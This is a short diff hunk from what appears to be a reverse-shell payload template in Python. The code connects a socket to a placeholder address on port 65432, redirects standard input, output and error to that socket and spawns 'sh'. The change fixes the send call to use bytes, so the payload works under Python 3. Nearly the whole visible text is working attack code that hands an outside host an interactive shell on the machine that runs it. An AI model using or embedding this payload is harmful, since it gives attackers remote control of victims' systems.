@@ -6,6 +6,6 @@ import pty
 
 s = socket.socket()
 s.connect(("{ip}", 65432))
-s.send("{success_message}")
+s.send(b"{success_message}")
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
 pty.spawn("sh")
